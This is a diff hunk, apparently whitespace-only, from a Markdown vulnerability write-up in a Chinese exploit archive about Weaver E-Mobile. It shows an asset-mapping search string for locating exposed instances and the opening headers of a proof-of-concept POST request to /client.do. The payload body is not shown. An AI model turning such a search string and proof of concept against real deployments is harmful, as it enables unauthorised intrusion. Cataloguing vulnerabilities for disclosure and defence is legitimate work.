@@ -55,12 +55,12 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 资产测绘  
 ```
-"Weaver E-Mobile"                    
+"Weaver E-Mobile"                    
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJ6Dn2bxuZnGiaNzXB5M1j7LdAo39sS6qxt5N8IibeJsXJlM1LGRN41wJnkJWxKRN4UvoDrOV6JoHLw/640?wx_fmt=png&from=appmsg "")  
   
-    
+    
   
 05  
   
@@ -71,7 +71,7 @@ source: "gelusus/wxvl 公众号漏洞文库"
 POC  
 ```
 POST /client.do HTTP/1.1
-Host:  127.0.0.1
+Host:  127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
